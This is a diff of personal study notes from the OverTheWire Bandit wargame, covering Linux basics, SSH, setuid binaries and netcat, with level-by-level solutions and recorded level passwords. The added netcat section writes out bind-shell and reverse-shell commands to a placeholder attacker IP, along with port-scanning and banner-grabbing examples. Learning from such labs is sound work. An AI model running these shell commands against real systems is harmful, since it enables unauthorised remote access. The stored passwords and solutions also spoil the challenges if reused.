@@ -1,6 +1,32 @@
+Standard SSH vs. Direct Command Execution1. Standard SSH Login (ssh bandit18@...)
+  -Authentication: You authenticate with your credentials.
+1.Default Shell Lookup: sshd checks /etc/passwd on the server to see your assigned default shell (which is set to 2.bash).
+3.Launch Bash: sshd launches /bin/bash in login mode.
+4.Load Config: bash reads and executes ~/.bashrc.
+5.Session Killed: The line added to .bashrc executes exit or logout $\rightarrow$ Your session immediately disconnects.
+
+  -Direct Command Execution (ssh bandit18@... /bin/sh)
+1.Authentication: You authenticate with your credentials.
+2.Bypass Default Shell: sshd sees an explicit command (/bin/sh) attached to the SSH request and ignores the default shell setting in /etc/passwd.
+3.Direct Execution: sshd invokes /bin/sh directly.
+4.Skip .bashrc: sh starts up without reading ~/.bashrc $\rightarrow$ You get an active, uninterrupted shell.
+
+You can ssh -i key -l bandit17 bandit.labs.overthewire.org -p 2220 ls -la -> it will print ls -la without access server
+
 Bandit Level  : 
 The password for accessing bandit is: 
 bandit@bandit : 
+
+Sample CLI :
+touch myfile.txt
+echo "Hello world" > myfile.txt
+cat > myfile.txt
+echo "Second line" >> myfile.txt
+rm myfile.txt (permanently deleted; not in the recycle bin)
+vim myfile.txt (You can also edit directly)
+
+find .	Current directory (. = "here")
+find /	Root of the filesystem (/)
 
 find * inspect only files in his directory; find . Inspect every single file recursive
 ''=$name,""=John
@@ -23,6 +49,51 @@ Telnet(TCP port23) and SSH(TCP port22) are not the same; while both are network 
 vim [name], chmod 400 [name]
 chmod 400 = sets a file to read-only for the owner, no access for anyone else (-r--------).
 chmod 600 = sets a file to read and write for the owner, no access for anyone else (-rw-------).
+
+vim = Text Editor like notepad
+
+Nmap (Network Mapper) used to identify active hosts, open ports, running services, and operating systems by sending IP packets and analyzing responses.
+
+Ncat file transfers with encryption
+
+SCP (Secure Copy Protocol) is a method for securely transferring files between local and remote hosts over an encrypted SSH connection
+
+A SetUID (Set User ID) binary is a special executable file configured to run with the permissions of the file owner, regardless of who executes it.
+You can check SetUID binary by 'ls -la' and you will see "rws" on left side
+When ls -la and Standard owner permissions look like rwx (Read, Write, Execute). When SetUID is enabled, the owner's execute bit x changes to a lowercase s (rws).
+
+Netcat(ncat) often called the "Swiss army knife" of networking,It is a command-line utility that reads and writes raw data across network connections using the TCP or UDP protocols.
+You can use Netcat to send and receive data between computers if they are on the same network (like P.Sophon)
+
+Such as
+Simple Chat
+Receiver (Listener): ncat -l -p 4444 (-l = listen)
+Sender (Client): ncat <Receiver-IP> 4444
+
+File Transfer
+Receiver (Listens and saves incoming data): ncat -l -p 4444 > received_file.txt
+Sender (Reads local file and pushes it over TCP): ncat <Receiver-IP> 4444 < file_to_send.txt
+
+Port Scanning
+ncat -zv 192.168.1.100 22 80 443
+-z: Zero-I/O mode. Connects to the port to check status without sending payload data.
+-v: Verbose output. Displays whether the connection succeeded or was refused.
+
+Banner Grabbing = Banner grabbing is a reconnaissance technique used to discover the exact application name and version running on a specific port (such as SSH, HTTP, or FTP).
+ncat -v 192.168.1.50 22 -> 
+Sample Output:
+Connection to 192.168.1.50 22 port [tcp/ssh] succeeded!
+SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
+
+Bind Shell = The target system binds a local shell to an open port and listens for an incoming connection.
+Target (Victim): ncat -l -p 4444 -e /bin/bash (Hacker runs this open port secretly if someone connects to me, they can execute bash) - may call backdoor
+Attacker: ncat <Target-IP> 4444 (Hacker connects to me on the present may be stuck on the firewall)
+
+Reverse Shell
+Attacker (Listens for incoming shell): ncat -l -p 4444 (Hacker opens port)
+Target (Calls back to attacker): ncat <Attacker-IP> 4444 -e /bin/bash (Hacker runs this command he wants me to access his port. This method can ignore the firewall) - connect to his port and let him execute bash
+
+---
 
 OverTheWire/Wargames/Bandit
 
@@ -92,22 +163,26 @@ Bandit Level 15 : Learn to send plaintext to difference port for using SSL/TLS e
 The password for accessing bandit15 is: pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7
 bandit15@bandit : ncat --ssl localhost 30001
 
-Bandit Level 16 : learn to find port with server by range
+Bandit Level 16 : learn to find port with the server by range and learn to use chmod and vim (on Linux, like Notepad)
 The password for accessing bandit16 is: kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V
-bandit16@bandit : nmap -sV -p 31000-32000 localhost(find port that encryption each and see which port open the server)
+bandit16@bandit : nmap -sV -p 31000-32000 localhost(find port that encrypts each and see which port the server opens), chmod 400 (read-only for private key) key.txt, ssh -i text.txt(connect by using private key) 
 
-Bandit Level  : 
-The password for accessing bandit is: 
-bandit@bandit : 
+Bandit Level 17  : Learn to find the different text in two files
+The password for accessing bandit17 is: You have to use the private key from the previous level or pWXMAZoxGC8JmDMfmT5MGEsobMM3vnj2 (You can check on /etc/bandit_pass)
+bandit17@bandit : diff passwords.old passwords.new
 
-Bandit Level  : 
-The password for accessing bandit is: 
-bandit@bandit : 
+Bandit Level 18 : Learn how to ignore .bashrc go directly by using /bin/sh append (You can also append with ls -la or something else)
+The password for accessing bandit18 is: OQxXZjELndr90zuhOTDYBEomI0SZITXI () use /bin/sh for bypass bash(default way) go directly
+bandit18@bandit : ssh -t (Force  pseudo-terminal allocation.), ssh -t -l bandit18 bandit.labs.overthewire.org -p 2220 /bin/sh
 
-Bandit Level  : 
-The password for accessing bandit is: 
-bandit@bandit : 
+Bandit Level 19 : You will know what is SetUID it allows you to use permissions as the owner
+The password for accessing bandit19 is: KpsOfPkcP7i1FlIExk2QEjyt6dw8dxZI
+bandit19@bandit : ./bandit20-do cat /etc/bandit_pass/bandit20 (runs command as a user bandit20 because bandit20-do is a setuid binary file)
 
-Bandit Level  : 
-The password for accessing bandit is: 
-bandit@bandit : 
+Bandit Level 20 : Learn how to open a different port and how to be a receiver and sender
+The password for accessing bandit20 is: 4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
+bandit20@bandit : cat /etc/bandit_pass/bandit20 | ncat -l -p 1024 (Set this terminal as a listener on port 1024, and whoever connects to the server will send a password(before pipe)), ./suconnect 1024
+
+Bandit Level 21 : 
+The password for accessing bandit21 is: bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
+bandit21@bandit : 
